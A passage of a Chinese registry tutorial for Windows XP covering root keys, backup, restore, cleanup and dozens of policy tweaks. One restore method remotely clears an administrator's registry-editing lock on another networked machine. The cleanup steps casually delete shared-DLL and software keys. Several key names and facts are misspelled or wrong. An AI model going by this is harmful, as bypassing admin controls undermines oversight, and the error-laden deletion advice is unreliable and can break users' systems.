HKEY_CLASSES_ROOT</h2><p>​\t我们知道，在这一个根键中记录的是WINDOWS操作系统中所有数据文件的信息内容，主要记录了不同文件的文件扩展名和与之相对应的应用程序。这就是为什么我们双击某一个文档的时候，可以由系统自动调出应用程序的所在了。<br>​\t这个根键的子键当大家展开时发现是非常多的，它主要分为两种：一是已经注册的各类文件的扩展名；一是各种文件类型的有关信息。</p>\n<p>下面我们以AVIFILE举例说明一下其下面的子项的含义：</p>\n<p>1、CLSID：分类标识，系统可以用这个类标识来识别相同类型的文件</p>\n<p>2、Compressors：它下面有两个子项：</p>\n<p>​\t\t\tauds:用于设置音频数据压缩程序的类标识；</p>\n<p>​\t\t\tvids:用于设置视频数据压缩程序的类标识</p>\n<p>3、defaultlcon：用于设置默认图标，这个大家可以改一下试试</p>\n<p>4、RIFFHandlers：在它的下面有两个类标识：</p>\n<p>​\t\t\tAVI：用于设置AVI文件的类标识；</p>\n<p>​\t\t\tWAVE：用于设置WAVE文件的类标识</p>\n<p>5、protocol：包括了执行程序和编辑程序的路径和文件名：</p>\n<p>​\t\t\tStdExecute（stdfileediting)server：用于指定编辑程序；</p>\n<p>​\t\t\tStdExecute（stdfileediting)PackageObjects:用于指定后打开AVI包对象的编辑程序；</p>\n<p>​\t\t\tStdExecute（stdfileediting)_verb：用于设置编辑程序时的工作状态，其中有0、1、2等状态</p>\n<p>6、Shell子项：用于设置视频文件的外壳：</p>\n<p>​\t\t\topen:用于设置打开AVI文件的程序；</p>\n<p>​\t\t\tplay：用于设置播放命令的程序</p>\n<p>7、Shellex：包括了视频文件的外壳扩展</p>\n<h2 id=\"第四课-HKEY-CURRENT-USER\"><a href=\"#第四课-HKEY-CURRENT-USER\" class=\"headerlink\" title=\"第四课 HKEY_CURRENT_USER\"></a>第四课 HKEY_CURRENT_USER</h2><p>​\t\t此根键中保存的信息（当前用户的子项信息）与HKEY_USERS_DEFAULT下面的一模一样的。</p>\n<p>任何对 HKEY_CURRENT_USER根键中的信息的修改都会导致对HKEY_USERS_DEFAULT中子项的修改。</p>\n<h2 id=\"第五课-HKEY-LOCAL-MACHINE\"><a href=\"#第五课-HKEY-LOCAL-MACHINE\" class=\"headerlink\" title=\"第五课 HKEY_LOCAL_MACHINE\"></a>第五课 HKEY_LOCAL_MACHINE</h2><p>​\t\t此根键中存放的是用来控制系统和软件的设置，由于这些设置是针对那些使用Windows系统的用户而设置</p>\n<p>的，是一个公共配置信息，所以它与具体的用户没多大关系。</p>\n<p>1、HARDWARE子项：该子项包括了系统使用的浮点处理器、串口等信息：</p>\n<p>​\t\t\tACPI:存放高级电源管理接口数据；</p>\n<p>​\t\t\tDEVICEMAP：用于存放设备映射；</p>\n<p>​\t\t\tDEscriptION：存放有关系统信息；</p>\n<p>​\t\t\tRESOURCEMAP：用于存放资源列表</p>\n<p>2、SAM子项：这部分被保护了，看不到，可以更改权限后再进行查看，应该是存放计算机上存在的所有用户的名</p>\n<p>称(包括隐藏用户)，<del>（如果没记错的话）</del></p>\n<p>3、SECURITY子项：该子项只是为将来的高级功能而预留的</p>\n<p>4、SOFTWARE子项：该子项中保留的是所有已安装的32位应用程序的信息，各个程序的控制信息分别安装在相应</p>\n<p>的子项中，由于不同的计算机安装的应用程序互不相同，因此这个子项下面的子项信息也不完全一样。</p>\n<p>5、SYSTEM子项：该子项是启动时所需的信息和修复系统时所需要的信息：</p>\n<p>​\t\t\tcurrentcontrol:保存了当前驱动程序控制集中的所有信息</p>\n<h2 id=\"第六课-HKEY-USERS\"><a href=\"#第六课-HKEY-USERS\" class=\"headerlink\" title=\"第六课 HKEY_USERS\"></a>第六课 HKEY_USERS</h2><p>​\t\t此根键中保存的是默认用户（default)，当前登录用户和软件（software) 的信息，其中DEFAULT子项是其中最重要的，它的配置是针对未来将会被创建的新用户的。新用户根据默认用户的配置信息来生成自己的配置文件，该配置文件包括环境、屏幕和声音等多种信息，其中常用的3项有：</p>\n<p>1、AppEvents子项：它包括了各种应用事件的列表：</p>\n<p>​\t\t\tEventLabels:按字母顺序列表；</p>\n<p>​\t\t\tSchemes:按事件分类列表</p>\n<p>2、Control Panel子项：它包括内容与桌面、光标、键盘和鼠标等设置有关</p>\n<p>3、Keyboard layout子项：用于键盘的布局（如语言的加载顺序等）<br>            Preload:语言的加载顺序<br>            Substitutes:设置可替换的键盘语言布局<br>            Toggle:用于选择键盘语言</p>\n<h2 id=\"第七课-HKEY-CURRENT-CONFIG\"><a href=\"#第七课-HKEY-CURRENT-CONFIG\" class=\"headerlink\" title=\"第七课 HKEY_CURRENT_CONFIG\"></a>第七课 HKEY_CURRENT_CONFIG</h2><p>​\t此根键存放的是当前配置的文件信息。<br>实际上细心的读者已经发现了，五大根键实际上并不是五个，现在把这个做了总结</p>\n<p>​\t我们都知道用regedit或regedit32都可以打开注册表文件，在XP系统下的时候，这两种方法其实都是一样的，当我们打开注册表后看到了类似资源管理器的东西，这里面都有什么呢？<br>​\t\tHKEY_CLASSES_ROOT<br>​\t\tHKEY_CURRENT_USER<br>​\t\tHKEY_LOCAL_MACHINE<br>​\t\tHKEY_USERS<br>​\t\tHKEY_CURRENT_CONFIG<br>​\t看是五个分支，<strong>其实就是HKEY_LOCAL_MACHINE、HKEY_USERS这两个才是真正的注册表键</strong>，其它都是从某</p>\n<p>个分支映射出来的，相当于快捷方式或是别名，这样的话看注册表就简单了许多了，现在说一下每个分支的作用：</p>\n<p>​\t\tHKEY_CLASSES_ROOT：列出当前计算机注册的所有COM服务器和与应用程序相关联的所有文件扩展名。<br>​\t\tHKEY_CURRENT_USER：保存着当前登录到由这个注册服务的计算机上的用户配置文件。<br>​\t\tHKEY_LOCAL_MACHINE：保存操作系统及硬件相关信息的配置单元，它是一个公共的配置信息与具体用户无关，其中关键是两个键值<br>​\t\t\t\tSOFTWARE：保存着与这台电脑中安装的应用程序相关的设置。<br>​\t\t\t\tSYSTEM：WINDOWS所装载的设备驱动程序以及当WINDOWS启动时所需要的各种参数。<br>​\t\tHKEY_USERS：包含当前计算机所有用户配置文件。<br>​\t\tHKEY_CURRENT_CONFIG： 计算机当前会话中的所有硬件配置信息。</p>\n<h2 id=\"第八课-注册表的基本操作\"><a href=\"#第八课-注册表的基本操作\" class=\"headerlink\" title=\"第八课  注册表的基本操作\"></a>第八课  注册表的基本操作</h2><p>1、创建项和项值</p>\n<p>2、更值项的数据</p>\n<p>3、删除项、子项或值项</p>\n<p>4、查找项、值项或数据</p>\n<h3 id=\"注册表中常用的数据类型有5种：\"><a href=\"#注册表中常用的数据类型有5种：\" class=\"headerlink\" title=\"注册表中常用的数据类型有5种：\"></a>注册表中常用的数据类型有5种：</h3><p>​\t\t二进制值（reg_binary）:多数硬件信息以二进制数据存储，而以十六进制格式显示在注册表编辑器中</p>\n<p>​\t\t字符串值（reg_sz）:包括字符串的注册表键，使用字符串数据类型</p>\n<p>​\t\t双字节值（reg_dword）:是32位信息常显示成4个字节。它在出错控制功能上用处极大，其数据一般以十六进</p>\n<p>制格式显示在注册表编辑器中。<br>        多字符串值(reg_multi_sz):允许将一系列项目作为单独的一个值使用。对于多种网络协议、多个项目、设备列</p>\n<p>表以及其他类似的列表项目来说，可以使用多字符串值可扩充字符串值（reg_expand_sz）：代表一个可扩展的字</p>\n<p>符串</p>\n<h2 id=\"第九课-注册表破坏的现象及原因\"><a href=\"#第九课-注册表破坏的现象及原因\" class=\"headerlink\" title=\"第九课  注册表破坏的现象及原因\"></a>第九课  注册表破坏的现象及原因</h2><h3 id=\"一、注册表破坏后的常见现象\"><a href=\"#一、注册表破坏后的常见现象\" class=\"headerlink\" title=\"一、注册表破坏后的常见现象\"></a>一、注册表破坏后的常见现象</h3><p>​\t\t1、无法启动系统<br>​\t\t2、无法运行或正常运行合法的应用程序<br>​\t\t3、找不到启动系统或运行应用程序所需的文件<br>​\t\t4、没有访问应用程序的权限<br>​\t\t5、不能正确安装或装入驱动程序<br>​\t\t6、不能进行网络连接<br>​\t\t7、注册表条目有错误</p>\n<h3 id=\"二、注册表被破坏的原因\"><a href=\"#二、注册表被破坏的原因\" class=\"headerlink\" title=\"二、注册表被破坏的原因\"></a>二、注册表被破坏的原因</h3><p>​\t\t1、应用程序错误：这个出现的时候比较多，因为我们知道应用程序或多或少的时候都有错误，都有可能导致</p>\n<p>不同的后果；另外在系统中安装过多的软件后，有可能出现彼此之间的冲突。</p>\n<p>​\t\t2、驱动程序不兼容：其实我发现好多出在系统自动安装的驱动程序上，如果你本身有驱动程序盘的话，还是</p>\n<p>用专业的比较好一些</p>\n<p>​\t\t3、硬件问题：这里面好我问题出现在硬件质量上，比如硬盘或内存质量不过关造成读写错误，或超频或CMOS或病毒等</p>\n<p>​\t\t4、误操作：这个大家不知出现了没有，您的误操作可能会导致注册表出现错误，有的时候甚至会很严重的。</p>\n<h2 id=\"第十课-备份注册表\"><a href=\"#第十课-备份注册表\" class=\"headerlink\" title=\"第十课  备份注册表\"></a>第十课  备份注册表</h2><h3 id=\"一、手工备份注册表\"><a href=\"#一、手工备份注册表\" class=\"headerlink\" title=\"一、手工备份注册表\"></a>一、手工备份注册表</h3><p>大家把以下几个文件直接复制到另一个文件夹就可以了<br>        1、在windows\\system32\\config下有以下几个文件用以保存系统配置：SAM,SYSTEM,SOFYWARE,DEFAULT<br>        2、在Documetents and settings\\username文件夹中保存用户配置文件：NETUSER.DAT,当然对应的LOG文件应该一块保存</p>\n<h3 id=\"二、注册表导出法导出注册表\"><a href=\"#二、注册表导出法导出注册表\" class=\"headerlink\" title=\"二、注册表导出法导出注册表\"></a>二、注册表导出法导出注册表</h3><p>​\t\t在文件中选择导出命令,回答文件名和位置，OK了</p>\n<h3 id=\"三、通过系统备份功能进行备份\"><a href=\"#三、通过系统备份功能进行备份\" class=\"headerlink\" title=\"三、通过系统备份功能进行备份\"></a>三、通过系统备份功能进行备份</h3><p>​\t\t1、选择开始—程序—附件—系统工具—备份</p>\n<p>​\t\t2、选择高级模式点下一步</p>\n<p>​\t\t3、选择system state(系统状态),在底下文件名中位置中回答路径及文件名</p>\n<p>​\t\t4、点击开始备份</p>\n<h2 id=\"第十一课-恢复注册表\"><a href=\"#第十一课-恢复注册表\" class=\"headerlink\" title=\"第十一课  恢复注册表\"></a>第十一课  恢复注册表</h2><p>1、重新启动系统恢复注册表</p>\n<p>​\t 一重启就可以修正各种在注册表中出现的错误了，但是以硬盘上的注册表的信息正确为前提的。</p>\n<p>2、手工恢复注册表</p>\n<p>​\t把上节中复制出来的文件再弄回去就OK了。</p>\n<p>3、注册表导入法恢复</p>\n<p>​\t首先上节中的导出的文件你要有啊，然后运行regedit.exe文件，文件中的导入，选择要导入的注册表文件，点找开就可以了</p>\n<p>4、利用高级启动选项恢复注册表</p>\n<p>​\t重启计算机，启动时按F8键进入高级选项菜单， 选择最后一次正确的配置，回车了，OK</p>\n<p>5、通过局域网来恢复注册表</p>\n<pre><code> 这个我们一般是指连入局域网的某一计算机（我们假设叫aaaaa）的注册表被管理员锁了，但有另一台计算机（我们假设叫B）的注册表可以用，现在我们用B来解除A的锁定。\n</code></pre>\n<p>​\t进入B的注册表，选择文件中的连接网络注册表，在查找位置中输入aaaaa，这时注册表中出现了songxiang计算机的注册表，</p>\n<p>​\t修改键值：aaaaa\\HEKY_USERS\\S-1-5-21-823518204-688789844-842925246-500\\Software\\Microsoft\\</p>\n<p>Windows\\CurrentVersion\\Policies\\System下的disableregistrytools值改为0就可以了。</p>\n<p>​\tS-1-5-21-823518204-688789844-842925246-500这一大堆数知道什么意思吗，是超级管理员，重新安装系统</p>\n<h2 id=\"第十二课-注册表的优化\"><a href=\"#第十二课-注册表的优化\" class=\"headerlink\" title=\"第十二课  注册表的优化\"></a>第十二课  注册表的优化</h2><h3 id=\"一、我们为什么要优化注册表\"><a href=\"#一、我们为什么要优化注册表\" class=\"headerlink\" title=\"一、我们为什么要优化注册表\"></a>一、我们为什么要优化注册表</h3><p>1、在计算机使用过程中可能经常添加或删除应用程序；在上网时遇到恶意网站，向注册表强行添加信息；</p>\n<p>2、原来的应用程序卸载后注册表没删除，启动时出现没找到某某应用程序</p>\n<p>3、多余注册表的子项可能造成浪费或降低启动速度</p>\n<h3 id=\"二、手工优化注册表\"><a href=\"#二、手工优化注册表\" class=\"headerlink\" title=\"二、手工优化注册表\"></a>二、手工优化注册表</h3><p>1、清除多余的DLL文件<br>大家找到这个项：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShareDLLs，在这个项下存放的是共享的DLL信息，注意看括号里面的数据，它表示共享文件的数目，如果为0，那么删除掉吧</p>\n<p>2、安装卸载应用程序的垃圾信息<br>这个主要是一些非法卸载应用程序导致的，我们首先要知道什么程序被非法卸载了，这个很好办，你自己现在正使着的你是知道的，其余的就没用了<br>注册表位置：HKEY_CURRENT_USER\\Software HKEY_LOCAL_MACHINE\\Software看到没用的就全删了就行了</p>\n<p>3、系统安装时产生的无用信息：去掉吧，有可能启动变快呢</p>\n<p>​\t3.1、删除多余时区（我是只留北京时区）<br>​\t\t位置：HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Time Zones<br>​\t\t如果你只要北京时区的话，那么除了China Standard Time，其余的都删了吧</p>\n<p>​\t3.2、清除国家列表（我只留中华人民共和国）<br>​\t\t位置：HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Telephony\\Country List<br>​\t\t保留86号文件夹，其余删</p>\n<p>​\t3.3、清除多余的语言代码（我只保留英语—0409和中文—0804）<br>​\t\t位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrnetControlSet\\Control\\Nls\\Locale没用的删了吧</p>\n<p>​\t3.4、删除多余的键盘布局：<br>​\t\t位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrnetControlSet\\Control\\Keyboard Layouts<br>​\t\t你可以把每个键值都打开看看，不需要的输入法删除即可</p>\n<p>​\t\t3.5、删除失效的文件关联<br>​\t\t位置：HKEY_CLASSES_ROOT主键可分为两部分：第一部分用来定义文件类型；第二部分与第一部分一一对应，用于记录打开文件的应用程序。一般，在打开第二部分的可疑子项后，若该键下的COMMAND下没有内容，就可以删掉了</p>\n<h2 id=\"第十三课-个性化设置\"><a href=\"#第十三课-个性化设置\" class=\"headerlink\" title=\"第十三课  个性化设置\"></a>第十三课  个性化设置</h2><p>1、去掉桌面快捷方式上的小键头<br>位置：HKEY_CLASSES_ROOT\\LNKFILE项 ：IsShortcut<br>操作：删除此项</p>\n<p>2、隐藏桌面上的所有图标<br>位置：HKEY_CURRENT_USER\\Software\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoDesktop（双字节）<br>操作：值设为1</p>\n<p>3、修改桌面上“回收站”的名字及图标位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{645FF040-5081-101B-9F08-00AA002F954E}（这个大家也可直接查找“回收站”<br>修改：（默认）一项随便换个名字就可以了<br>然后展开此项，选择DEfaultIcon<br>这时大家看到有3个子项，意思吗一看就明白了<br>如果想改变图标时，只需将路径和文件名改了即可，比如改为”d:\\tt.ico”</p>\n<p>4 、去掉桌面上的网上邻居<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoNetHood（双字节）值： 1</p>\n<p>5、在桌面上显示系统版本号<br>位置：HKEY_CURRENT_USER\\Control Panel\\Desktop<br>项：PaintDesktopVersion<br>修改：将值改为1</p>\n<p>6、改变窗口按钮字体的颜色<br>位置：HKEY_CURRENT_USER\\Control Pannel\\Colors<br>键值：ButtonText<br>修改：大家知道PS吧，比如改为红么(255,0,0)</p>\n<p>7、屏蔽桌面上的IE图标<br>位置：HKEY_CURRENT_USER\\Software\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建值项：NoInternetIcon<br>修改：1</p>\n<p>8、禁止更改桌面墙纸<br>位置：HKEY_CURRENT_USER\\Software\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建项值：NoChangingWallPaper(双字节）<br>修改：1</p>\n<p>9、设置登录背景<br>位置：HKEY_USERS\\DEFAULT\\ControlPanel\\Desktop<br>键值：WallPaper<br>修改：把背景图片一写就OK了（比如C:\\aa.bmp）<br>—————-以上需重启计算机—————-</p>\n<p>10、更改：我的电脑的提示信息位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{20D04FE0-3AEA-1069-A2D8-08002B30309D}<br>键值：InfoTip<br>修改：哈，随便打吧，我打成了“这是我的电脑噢”</p>\n<p>11、更改：回收站的提示信息位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{645FF040-5081-101B-9F08-00AA002F954E}<br>键值：InfoTip<br>修改：跟上面一样,自己改吧</p>\n<p>12、更改IE的提示信息位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{871C5380-42A0-1069-A2EA-08002B30309D}<br>键值：InfoTip<br>修改：同上</p>\n<p>13、更改网上邻居的提示信息位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{208D2C60-3AEA-1069-A2D7-08002B30309D}<br>键值：InfoTip<br>修改：同上</p>\n<p>14、更改我的文档的提示信息位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{450D8FBA-AD25-11D0-98A8-0800361B1103}<br>键值：InfoTip<br>修改：同上</p>\n<p>15、更改任务计划提示信息位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{D6277990-4C6A-11CF-8D87-00AA0060F5BF}<br>键值：InfoTip<br>修改：同上</p>\n<p>16、改变桌面图标顺序位置：<br>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID{450D8FBA-AD25-11D0-98A8-0800361B1103}<br>键值：SortOrderIndex<br>修改：48（我的文档在第一位）<br>54（我的电脑在第一位）</p>\n<p>17、禁止帮助提示信息(需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced<br>键值：showinfotip<br>修改：0</p>\n<p>18、用真彩色显示图标(需重启）<br>位置：HKEY_CURRENT_USER\\Control<br>Panel\\Desktop\\WindowMetrics<br>键值：Shell Icon BPP<br>修改：32</p>\n<p>19、更改图标显示尺寸(需重启）<br>位置：HKEY_CURRENT_USER\\Control Panel\\Desktop\\WindowMetrics<br>键值：Shell Icon SIZE<br>修改：在显示器分辨率为1024<em>768时可改为：48；在显示器分辨率为1600</em>1200时可改为：64</p>\n<p>20、自动清除“文档”菜单中的历史记录（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：CleanReccentDocsOn-Exit<br>(REG-DWORD)值：1</p>\n<p>21、禁止“文档”的历史记录（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoReccentDocsHistory<br>(REG-DWORD)值：1</p>\n<p>22、去掉开始菜单的“文档”项（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoReccentDocsMenu<br>(REG-DWORD)值：1</p>\n<p>23、去掉开始菜单的“查找”项（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoFind<br>(REG-DWORD)值：1</p>\n<p>24、去掉开始菜单的“运行”项（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoRun<br>(REG-DWORD)值：1</p>\n<p>25、禁止用户更改“开始”菜单（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoChangeStartMenu<br>(REG-DWORD)值：1</p>\n<p>26、禁止显示开始菜单中的windows update项（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoWindowsUpdate<br>(REG-DWORD)值：1</p>\n<p>27、屏蔽开始菜单中的“关闭计算机”项（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建：NoClose (REG-DWORD)值：1</p>\n<p>28、加快“开始”菜单与“任务栏”的速度<br>位置：HKEY_CURRENT_USER\\Control Panel\\Desktop<br>键值：MenuShowDelay<br>值：数值资料改为100或更小（默认值为：400），建议不要使用0，因为如此一来只要鼠标一不小心触碰到“所有程序”，整条菜单就会跑出来，那这乱了套。</p>\n<p>29、为回收站的右键菜单增加“删除”和“重命名”<br>位置：HKEY_CLASSES_ROOT\\CLSID{645FF040-5081-101B-9F08-00AA002F954E}\\ShellFolder<br>键值：Attributes<br>值：70 01 00 20</p>\n<p>30、为右键菜单添加“在新窗口打开”命令<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\shell<br>新建子项：NewWindow<br>修改：将默认值项值改为“在新窗口打开”<br>继续：在NewWindow项下新建个子项command<br>修改：将默认值项值改为explorer.exe</p>\n<p>31、为右键菜单添加“快速关闭计算机”命令<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\shell<br>新建子项：<br>快速关闭计算机<br>修改：将默认值项值改为“快速关闭计算机”<br>继续：在NewWindow项下新建个子项command<br>修改：将默认值项值改为”c:\\windows\\rundll32.exe user.exe,exitwindowsexec”</p>\n<p>32、禁止任务栏的快捷菜单（需重启)<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建键值：NoTrayContextMenu<br>(REG_DWORD)值：1</p>\n<p>33、将任务栏显示时间的地方改为要显示的文字（需重启）<br>位置：HKEY_CURRENT_USER\\Control Panel\\International<br>键值：STimeFormat<br>修改：自己喜欢什么文字就改成什么吧</p>\n<p>34、禁止使用任务栏（需重启）<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer<br>新建键值：NoSetTaskBar<br>(REG_DWORD)修改：1</p>\n<h2 id=\"第十四课-系统设置-控制面板常用选项设置，系统性能优化设置\"><a href=\"#第十四课-系统设置-控制面板常用选项设置，系统性能优化设置\" class=\"headerlink\" title=\"第十四课  系统设置(控制面板常用选项设置，系统性能优化设置)\"></a>第十四课  系统设置(控制面板常用选项设置，系统性能优化设置)</h2><p>1、禁用“控制面板”中的“显示”选项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies<br>新建项值：System<br>新建值项：NodispCPL<br>（REG_DWORD）<br>值：1</p>\n<p>2、屏蔽显示选项中的“屏幕保护程序”<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System<br>新建值项：NoDispScrSavPage<br>   （REG_DWORD）<br>值：1</p>\n<p>3、屏蔽显示选项中的“外观”<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System<br>新建值项：NoDispAppearancePage<br>   （REG_DWORD）值：1</p>\n<p>4、屏蔽显示选项中的“设置”<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System<br>新建值项：NoDispSettingsPage<br>   （REG_DWORD）值：1</p>\n<p>5、屏蔽显示选项中的“屏幕保护程序密码”<br>位置：HKEY_CURRENT_USER\\Software\\Policies\\Microsoft<br>新建项：Control Panel<br>再新建子项：Desktop<br>新建值：ScreenSaverIsSecure (REG_DWORD)值：1</p>\n<p>6、禁止使用“添加删除程序”项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies<br>新建子项：Uninstall<br>新建值项：NoAddRemovePrograms (REG_DWORD)值：1</p>\n<p>7、屏蔽“添加删除程序”中的“更改或删除程序”选项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\uninstall<br>新建值项：NoRemovePage  (REG_DWORD)值：1</p>\n<p>8、屏蔽“添加删除程序”中的“添加新程序”选项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\uninstall<br>新建值项：NoAddpage (REG_DWORD)值：1</p>\n<p>9、屏蔽“添加删除程序”中的“添加或删除windows组件”选项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\uninstall<br>新建值项：NoWindowsSetupPage (REG_DWORD)值：1</p>\n<p>10、屏蔽“添加删除程序”中的“更改或删除程序”中的“单击此处获得支持信息”选项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\uninstall<br>新建值项：NoSupportInfo (REG_DWORD)值：1</p>\n<p>11、屏蔽“更改或删除程序”中的“添加新程序”中的“从CD-ROM或软盘安装程序”选项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\uninstall<br>新建值项：NoAddFromCDorFloppy (REG_DWORD)值：1</p>\n<p>12、屏蔽“更改或删除程序”中的“添加新程序”中的“从Microsoft添加程序程序”选项<br>位置：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\uninstall<br>新建值项：NoAddFromInternet (REG_DWORD)值：1</p>\n<p>13、设置windows的关机时间<br>位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control<br>值项：WaitToKillServiceTimeout<br>修改：它以毫秒为单位，请自行设置</p>\n<p>14、更改windows服务启动的顺序<br>位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ServiceGroupOrder<br>值项：ServiceGroupOrder<br>修改：按你想要的顺序自行输入</p>\n<p>15、更改windows启动时运行的程序<br>位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session<br>Manager<br>值项：BootExecite<br>修改：自行输入一行启动时要执行的命令即可</p>\n<p>16、删除多余的DLL文件<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SharedDlls<br>值项：这里好多了，都是DLL的，注意看好了，所有是0的都是没用的，删了即可，然后再将相应的系统文件夹中的文件删除</p>\n<p>17、删除不必要的自启程序<br>位置：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run<br>值项：这里面列出的都是启动项，不要的可以删掉，他和msconig中列出的是一样的</p>\n<p>18、清除注册表垃圾（需重启）<br>位置1：HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall<br>位置2：HKEY_LOCAL_MACHINE\\SOFTWARE<br>操作：很简单了，没用的删了吧</p>\n<p>19、自动刷新窗口（需重启）<br>位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Update<br>键值：UpdateMode<br>修改：0</p>\n<p>20、更改开始菜单存放的目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<br>键值：Start Menu<br>修改：把要改到的路径添上就可以了,并将原源件复制到目标文件夹下</p>\n<p>21、更改开始菜单中的程序的存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<br>键值：Program<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p>\n<p>22、更改开始菜单中的程序里的应用程序存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<br>键值：appdate<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p>\n<p>23、更改开始菜单中的程序里的发送到存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<br>键值：SendTo<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下,其实我们也可以在这里建立一个新的发送到项目，比如发送到你的U盘</p>\n<p>24、更改开始菜单中的程序里的启动程序存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<br>键值：StartUp<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p>\n<p>25、更改网页历史记录存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<br>键值：History<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p>\n<p>26、更改我的文档存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<br>键值：Personal<br>修改：把要改到的路径添上就可以了，并将原源件复制到目标文件夹下</p>\n<p>27、更改新建文件的存放目录（需重启）<br>位置：HKEY_USERS.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell 